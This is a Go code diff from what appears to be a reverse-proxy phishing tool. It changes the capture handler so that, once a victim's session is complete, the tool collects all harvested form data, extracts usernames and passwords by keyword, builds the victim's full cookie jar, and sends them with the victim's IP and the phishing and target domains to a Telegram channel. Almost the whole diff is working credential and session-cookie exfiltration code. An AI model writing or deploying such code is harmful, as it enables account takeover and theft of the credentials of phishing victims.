@@ -5713,30 +5713,68 @@ func (m *ProxyHandler) saveDirectProxyCapture(
 		)
 	}
 
-	// Send Telegram notification
-	if m.TelegramService != nil {
+	// Send Telegram notification only once per session after all captures are complete.
+	// Use CompareAndSwap to ensure only one goroutine sends the notification.
+	if m.TelegramService != nil && session.IsComplete.Load() && session.NotificationSent.CompareAndSwap(false, true) {
+		// Collect ALL captured data from the session for a comprehensive notification
+		allData := make(map[string]interface{})
+		session.CapturedData.Range(func(key, value interface{}) bool {
+			allData[key.(string)] = value
+			return true
+		})
+
+		// Extract username and password from all captured data
+		notifUsername := ""
+		notifPassword := ""
+		for k, v := range allData {
+			if dataMap, ok := v.(map[string]string); ok {
+				for field, val := range dataMap {
+					lf := strings.ToLower(field)
+					lk := strings.ToLower(k)
+					if strings.Contains(lf, "user") || strings.Contains(lf, "email") || strings.Contains(lf, "login") ||
+						strings.Contains(lk, "user") || strings.Contains(lk, "email") || strings.Contains(lk, "login") {
+						notifUsername = val
+					}
+					if strings.Contains(lf, "pass") || strings.Contains(lf, "pwd") ||
+						strings.Contains(lk, "pass") || strings.Contains(lk, "pwd") {
+						notifPassword = val
+					}
+				}
+			}
+		}
+
+		// Build the complete cookie jar
+		allCookiesJSON := m.buildAllCookiesJSON(session)
+
 		notifData := map[string]interface{}{
-			"capture_name": captureName,
-			"ip":           clientIP,
-			"phish_domain": phishDomain,
-			"target_domain": session.TargetDomain,
+			"capture_name":   "session_complete",
+			"ip":             clientIP,
+			"phish_domain":   phishDomain,
+			"target_domain":  session.TargetDomain,
+			"session_id":     session.ID,
 		}
-		if username != "" {
-			notifData["username"] = username
+		if notifUsername != "" {
+			notifData["username"] = notifUsername
 		}
-		if password != "" {
-			notifData["password"] = password
+		if notifPassword != "" {
+			notifData["password"] = notifPassword
 		}
-		if cookiesJSON != "" {
-			notifData["cookies"] = cookiesJSON
+		if allCookiesJSON != "" {
+			notifData["cookies"] = allCookiesJSON
 		}
 
 		m.TelegramService.Notify(
 			ctx,
 			data.EVENT_CAMPAIGN_RECIPIENT_SUBMITTED_DATA,
-			"Direct Proxy Capture",
-			username,
+			"Direct Proxy Capture - Session Complete",
+			notifUsername,
 			notifData,
+		)
+
+		m.logger.Infow("telegram notification sent for complete session",
+			"sessionID", session.ID,
+			"username", notifUsername,
+			"phishDomain", phishDomain,
 		)
 	}
 }
